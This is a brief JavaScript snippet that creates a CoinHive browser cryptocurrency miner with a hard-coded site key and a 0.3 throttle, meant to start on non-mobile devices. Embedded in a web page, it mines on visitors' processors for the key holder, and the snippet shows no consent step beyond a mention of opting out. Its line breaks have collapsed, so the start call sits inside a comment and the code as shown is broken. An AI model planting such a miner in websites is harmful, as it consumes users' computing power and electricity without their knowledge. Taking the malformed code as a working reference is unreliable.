var miner = new CoinHive.Anonymous('yiL9gIWt2GptJHvwQ6egLT1mqFJ6bGLA', {
    throttle: 0.3
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile()) {miner.start();}